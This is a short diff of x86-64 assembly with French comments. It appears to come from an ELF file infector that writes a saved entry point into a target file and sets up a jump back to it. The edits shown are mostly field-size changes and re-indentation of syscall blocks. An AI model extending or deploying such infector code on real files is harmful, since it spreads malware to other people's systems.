@@ -50,7 +50,8 @@ section .bss
 
     new_vaddr resq 1
 
-    old_entry_point resq 1
+    old_entry_point resb 4
+    jmp_entry_point resb 4
 
 
 section .text
@@ -366,13 +367,18 @@ mov r15, buffer
     mov rdi, [file_descriptor]
     mov rsi, 0 
     mov rdx, 2        ; fin du fichier 
-   syscall  
+    syscall  
 
-    mov rax, 1         
-    mov rdi, [file_descriptor]       
-    mov rsi, old_entry_point 
-    mov rdx, 4
-    syscall
+
+
+    mov rax, 1    
+    mov rdi, [file_descriptor]
+    mov rsi, old_entry_point
+    mov rdx, 4     
+    syscall       
+
+
+
       
 
 ; =============== jump  =================
@@ -381,7 +387,7 @@ mov r15, buffer
     mov rdi, [file_descriptor]
     mov rsi, 0 
     mov rdx, 2        ; fin du fichier 
-   syscall  
+    syscall  
 
     mov rax, 1         
     mov rdi, [file_descriptor]       
